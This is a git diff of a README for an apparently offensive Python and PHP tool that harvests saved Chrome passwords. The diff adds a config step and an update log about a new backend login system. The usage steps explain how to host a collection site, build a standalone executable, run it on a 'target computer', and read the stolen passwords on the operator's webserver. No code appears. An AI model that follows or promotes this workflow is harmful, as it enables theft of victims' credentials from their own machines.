@@ -11,14 +11,17 @@ A Python and PHP based system to recover and log passwords from Chrome.
 Currently, a very crude backend and the recovery script have been finished. Known issues include the data file not deleting after it uploads itself to the webserver.
 
 # How to use this program
-- Clone the repo and upload the files in the "Site" folder to your website.
+- Clone the repo and upload the files in the "Site" folder to your website. Modify the username and password in the config file.
 - Run the python script and build a recovery file.
 - Note: The recovery file includes all libraries and Python. The target computer doesn't need anything installed.
 - Run the recovery file on the target computer then check your webserver (index page.)
 
+# Update log
+- v0.2 Implemented the login system.
+- v0.1 Initial Release
+
 # Future plans
 - GUI for the builder
-- Better backend with a login system
 - Support for multiple uploads (right now it only lets you have one data file.)
 
 I should have the backend and multiple upload features done shortly. The GUI builder is intended for the 1.0 release.
